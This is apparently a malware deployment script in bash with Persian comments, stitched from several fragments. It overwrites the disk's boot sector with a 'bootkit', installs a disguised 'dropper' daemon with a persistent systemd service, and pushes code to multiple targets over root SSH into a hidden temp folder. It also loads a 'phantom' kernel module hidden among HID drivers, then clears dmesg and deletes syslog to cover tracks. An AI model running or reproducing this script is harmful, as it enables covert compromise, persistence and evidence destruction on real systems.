// placeholder
 #!/bin/bash

if [ "$EUID" -ne 0 ]; then
 echo "Run as root"
 exit 1
 fi

# Install bootkit
 dd if=build/bootkit/bootkit.bin of=/dev/sda bs=446 count=1 conv=notrunc

# Install dropper
 cp build/user/dropper /usr/sbin/deepsick_daemon
 chmod +x /usr/sbin/deepsick_daemon

# Create systemd service
 cat > /etc/systemd/system/deepsick.service <<EOF
 [Unit]
 Description=DeepSick Service
 After=network.target

[Service]
 ExecStart=/usr/sbin/deepsick_daemon
 Restart=always
 StealthMode=true

[Install]
 WantedBy=multi-user.target
 EOF

systemctl daemon-reload
 systemctl enable deepsick.service
 systemctl start deepsick.service

echo "[+] Deployment completed"

set -e

TARGETS=("$@")
SSH_USER="root"
DEPLOY_DIR="/tmp/.systemd-update"

# تابع استقرار روی یک هدف
deploy_target() {
    local target=$1
    echo "[*] Deploying to $target"
    
    # ایجاد پوشه موقت
    ssh $SSH_USER@$target "mkdir -p $DEPLOY_DIR"
    
    # آپلود فایل‌ها
    scp -r core include scripts lib Makefile $SSH_USER@$target:$DEPLOY_DIR
    
    # کامپایل و نصب
    ssh $SSH_USER@$target <<EOF
        cd $DEPLOY_DIR
        make all
        make install
        ./scripts/load.sh
        rm -rf $DEPLOY_DIR
EOF
    
    echo "[+] Successfully deployed to $target"
}

# استقرار روی تمام اهداف
for target in "${TARGETS[@]}"; do
    deploy_target $target &
done

wait
echo "[*] Deployment completed to all targets"

# اسکریپت استقرار عملیاتی برای محیط‌های واقعی

TARGET="$1"
SSH_USER="root"
SSH_KEY="/path/to/ssh_key"
INSTALL_DIR="/lib/modules/$(uname -r)/kernel/drivers/hid"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# انتقال ماژول کرنل
scp -i $SSH_KEY phantom.ko $SSH_USER@$TARGET:$INSTALL_DIR/phantom.ko

# بارگذاری ماژول
ssh -i $SSH_KEY $SSH_USER@$TARGET <<EOF
    depmod -a
    modprobe phantom
    dmesg -C
    rm -f /var/log/syslog
    systemctl restart systemd-journald
EOF

echo "[+] Phantom deployed to $TARGET"
